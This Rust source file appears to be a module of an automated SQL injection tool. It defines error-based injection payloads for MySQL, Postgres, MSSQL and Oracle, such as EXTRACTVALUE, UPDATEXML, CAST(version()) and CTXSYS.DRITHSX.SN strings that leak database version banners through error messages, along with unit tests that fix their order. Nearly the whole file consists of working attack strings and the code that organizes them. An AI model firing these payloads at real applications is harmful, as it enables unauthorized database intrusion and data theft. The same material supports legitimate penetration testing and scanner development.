#![deny(unsafe_code)]

use crate::dbms::{
    mssql::payloads as mssql_p, mysql::payloads as mysql_p, oracle::payloads as oracle_p,
    postgres::payloads as pg_p,
};

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct ErrorPayload {
    pub payload: String,
    pub dbms: String,
}

/// Per-DBMS error payloads delegate to the canonical per-DBMS sets in
/// `crate::dbms::{mysql,postgres,mssql,oracle}::payloads` (single source of
/// truth, same pattern as `time_payloads_for`). Legacy payloads stay first
/// so `--level 1` budgets are byte-identical to the pre-enrichment behaviour.
///
/// - MySQL: `EXTRACTVALUE` (legacy), `GROUP BY COUNT` (legacy), `UPDATEXML`,
///   `EXP(~)` BIGINT overflow, `JSON_KEYS`
/// - Postgres: `CAST(version() AS int)` (legacy), `CAST(current_database())`
///   (legacy), `CAST(chr(126)||version()||chr(126) AS int)`
/// - MSSQL: `CONVERT(int,@@version)` (legacy, Msg 8114),
///   `CONVERT(int,DB_NAME())` (legacy), `CAST(@@version AS int)` (Msg 245),
///   `FOR XML PATH('')`
/// - Oracle: `CTXSYS.DRITHSX.SN` (legacy), `UTL_INADDR` (legacy),
///   `TO_NUMBER(banner)` (ORA-01722), `XMLTYPE(banner)`, `DBMS_XDB`
/// - Generic/`None`: the four legacies first (mysql/pg/mssql historically,
///   oracle appended), then one representative variant per DBMS so L1 stays
///   Compat (`take(2)` = historical mysql + pg) while L2/L3 sweep new channels.
#[must_use]
pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
    match dbms {
        Some("mysql") => mysql_p::mysql_error_payloads()
            .into_iter()
            .map(|p| ErrorPayload {
                payload: p,
                dbms: "mysql".to_owned(),
            })
            .collect(),
        Some("postgres") => pg_p::pg_error_payloads()
            .into_iter()
            .map(|p| ErrorPayload {
                payload: p,
                dbms: "postgres".to_owned(),
            })
            .collect(),
        Some("mssql") => mssql_p::mssql_error_payloads()
            .into_iter()
            .map(|p| ErrorPayload {
                payload: p,
                dbms: "mssql".to_owned(),
            })
            .collect(),
        Some("oracle") => oracle_p::oracle_error_payloads()
            .into_iter()
            .map(|p| ErrorPayload {
                payload: p,
                dbms: "oracle".to_owned(),
            })
            .collect(),
        _ => vec![
            // Legacies first — first three byte-identical to historical generic.
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -", "mysql"),
            ("' AND CAST((SELECT version()) AS int) --", "postgres"),
            ("' AND CONVERT(int,@@version) --", "mssql"),
            (
                "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                "oracle",
            ),
            // One representative variant per DBMS (L2/L3 sweep).
            (
                "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1) -- -",
                "mysql",
            ),
            (
                "' AND 1=CAST((SELECT chr(126)||version()||chr(126)) AS int) --",
                "postgres",
            ),
            ("' AND 1 IN (SELECT @@version FOR XML PATH('')) --", "mssql"),
            (
                "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --",
                "oracle",
            ),
        ]
        .into_iter()
        .map(|(p, d)| ErrorPayload {
            payload: p.to_owned(),
            dbms: d.to_owned(),
        })
        .collect(),
    }
}

/// Every DBMS-specific error payload (legacies + variants) for blind sweeps
/// when the backend is unknown. Ordering is stable: all legacies first
/// (mysql, postgres, mssql, oracle in per-DBMS order), then variants — so
/// `--level` budgets degrade gracefully to legacy coverage.
#[must_use]
pub fn all_error_payloads() -> Vec<ErrorPayload> {
    let mut legacies = Vec::new();
    let mut variants = Vec::new();
    for dbms in ["mysql", "postgres", "mssql", "oracle"] {
        let mut v = error_payloads_for(Some(dbms));
        if !v.is_empty() {
            // First two per DBMS are the historical legacies.
            let take = 2.min(v.len());
            legacies.extend(v.drain(..take));
            variants.extend(v);
        }
    }
    legacies.into_iter().chain(variants).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_compat_first_per_dbms() {
        assert_eq!(
            error_payloads_for(Some("mysql"))[0].payload,
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -"
        );
        assert_eq!(
            error_payloads_for(Some("postgres"))[0].payload,
            "' AND CAST((SELECT version()) AS int) --"
        );
        assert_eq!(
            error_payloads_for(Some("mssql"))[0].payload,
            "' AND CONVERT(int,@@version) --"
        );
        assert_eq!(
            error_payloads_for(Some("oracle"))[0].payload,
            "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --"
        );
        // Historical generic first three byte-identical.
        let g = error_payloads_for(None);
        assert_eq!(
            g[0].payload,
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -"
        );
        assert_eq!(g[1].payload, "' AND CAST((SELECT version()) AS int) --");
        assert_eq!(g[2].payload, "' AND CONVERT(int,@@version) --");
    }

    #[test]
    fn per_dbms_variants_present() {
        let mysql = error_payloads_for(Some("mysql"));
        assert!(
            mysql.iter().any(|p| p.payload.contains("UPDATEXML")),
            "{mysql:?}"
        );
        assert!(
            mysql.iter().any(|p| p.payload.contains("EXP(~")),
            "{mysql:?}"
        );
        assert!(
            mysql.iter().any(|p| p.payload.contains("JSON_KEYS")),
            "{mysql:?}"
        );
        let pg = error_payloads_for(Some("postgres"));
        assert!(pg.iter().any(|p| p.payload.contains("chr(126)")), "{pg:?}");
        let sql_server = error_payloads_for(Some("mssql"));
        assert!(
            sql_server
                .iter()
                .any(|p| p.payload.contains("FOR XML PATH")),
            "{sql_server:?}"
        );
        assert!(
            sql_server.iter().any(|p| p.payload.contains("CAST")),
            "{sql_server:?}"
        );
        let oracle = error_payloads_for(Some("oracle"));
        assert!(
            oracle.iter().any(|p| p.payload.contains("TO_NUMBER")),
            "{oracle:?}"
        );
        assert!(
            oracle.iter().any(|p| p.payload.contains("XMLTYPE")),
            "{oracle:?}"
        );
        assert!(
            oracle.iter().any(|p| p.payload.contains("DBMS_XDB")),
            "{oracle:?}"
        );
    }

    #[test]
    fn generic_sweeps_all_dbms_at_high_level() {
        let g = error_payloads_for(None);
        // 4 legacies + 4 variants.
        assert_eq!(g.len(), 8);
        for dbms in ["mysql", "postgres", "mssql", "oracle"] {
            assert!(g.iter().any(|p| p.dbms == dbms), "missing {dbms}");
        }
    }

    #[test]
    fn all_payloads_start_with_legacies() {
        let all = all_error_payloads();
        // 2 legacies × 4 DBMS = 8 legacies first.
        assert_eq!(all.len(), 5 + 3 + 4 + 5);
        assert!(all[0].payload.contains("EXTRACTVALUE"));
        assert!(all[2].payload.contains("CAST((SELECT version())"));
        assert!(all[4].payload.contains("CONVERT(int,@@version)"));
    }

    #[test]
    fn dbms_delegation_matches_canonical_sets() {
        assert_eq!(
            error_payloads_for(Some("mysql")).len(),
            mysql_p::mysql_error_payloads().len()
        );
        assert_eq!(
            error_payloads_for(Some("postgres")).len(),
            pg_p::pg_error_payloads().len()
        );
        assert_eq!(
            error_payloads_for(Some("mssql")).len(),
            mssql_p::mssql_error_payloads().len()
        );
        assert_eq!(
            error_payloads_for(Some("oracle")).len(),
            oracle_p::oracle_error_payloads().len()
        );
    }
}
